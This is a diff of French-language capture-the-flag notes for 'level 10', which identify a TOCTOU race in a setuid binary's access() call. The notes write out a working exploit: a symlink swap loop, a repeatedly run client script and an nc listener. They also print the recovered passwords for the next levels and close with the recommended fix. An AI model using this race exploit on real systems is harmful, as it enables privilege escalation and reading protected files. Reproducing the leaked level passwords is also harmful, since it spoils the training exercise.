@@ -37,7 +37,7 @@ LEVEL 10
 
     804870e:	e8 0d fe ff ff       	call   8048520 <printf@plt>
     804871a:	e8 71 fe ff ff       	call   8048590 <exit@plt>
-    8048749:	e8 92 fe ff ff       	call   80485e0 <access@plt>
+    8048749:	e8 92 fe ff ff       	call   80485e0 <access@plt>        --> Faille --> Access exploit - TOCTOU race (Time of Check to Time of Update)
     8048766:	e8 b5 fd ff ff       	call   8048520 <printf@plt>
     8048773:	e8 b8 fd ff ff       	call   8048530 <fflush@plt>
     804878f:	e8 5c fe ff ff       	call   80485f0 <socket@plt>
@@ -74,22 +74,73 @@ LEVEL 10
     ./level10 /tmp/x 127.0.0.1
         Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
     
+    nc -l 6969
+    ./level10 /tmp/x 127.0.0.1
 
-    Inside VM : 
-
-        ! Setup VM Bridge & Promiscous ALL
-        python -m SimpleHTTPServer 6969
-        Wireshark en0 + Filtre ip.src == ipvm
-        ./level10 /tmp/x 192.168.1.23
-
-
-    Inside Host : 
-        ifconfig
-
+        -> Fonctionne, maintenant faut bypass le token
     
+
+    https://stackoverflow.com/questions/7925177/access-security-hole
+    La faille d'access peut permettre d'envoyer le token bien qu'on ait pas les droits de lecture
+    Surtout que le open est fait bien après le access dont gap de temps en théorie suffisant
+    [race condition]
+
+    Extrait du man : 
+
+     The result of access() should not be used to make an actual access control decision,
+     since its response, even if correct at the moment it is formed, may be outdated at
+     the time you act on it.  access() results should only be used to pre-flight, such as
+     when configuring user interface elements or for optimization purposes.  The actual
+     access control decision should be made by attempting to execute the relevant system
+     call while holding the applicable credentials, and properly handling any resulting
+     errors; and this must be done even though access() may have predicted success.
+
+     Additionally, set-user-ID and set-group-ID applications should restore the effective
+     user or group ID, and perform actions directly rather than use access() to simulate
+     access checks for the real user or group ID.
+
+
+    On va avoir besoin d'un client qui se connecte en permanence :
+    
+    1. ln -s ~/token /tmp/x
+
+    2. vi /tmp/connect.sh
+
+        #!/bin/sh
+        while [ 1 ]
+        do
+            ~/level10 /tmp/x 127.0.0.1
+        done
+
+        sh /tmp/connect.sh
+    
+    3. nc -lk 6969
+    
+    Le problème ici est que la race condition n'est "s'ouvre" jamais car access ne fait pas d'erreur à proprement parlé, enfin ses prédictions sont juste disons
+    Donc il faut ajouter de quoi "tromper" access
+
+    4. 
+       #!/bin/sh
+       while [ 1 ]
+        do
+            rm -rf /tmp/x
+            touch /tmp/x
+            # Race condition here
+            ln -s ~/token /tmp/x
+        done
+
+    su flag10 woupa2yuojeeaaed06riuj63c
+    getflag
+    su level11 feulo4b72j7edeahuete3no7c
 
 
 * Solution
 
 ------------------------------------------------------------------------------------------------------------------------
+
+NB : 
+That is a TOCTOU race (Time of Check to Time of Update). A malicious user could substitute a file he has access to for a symlink to something he doesn't have access to between the access() and the open() calls. Use faccessat() or fstat(). In general, open a file once, and use f*() functions on it (e.g: fchown(), ...).
+
+NB : nc -lk =  Forces nc to stay listening for another connection after its current connection is completed
+
 
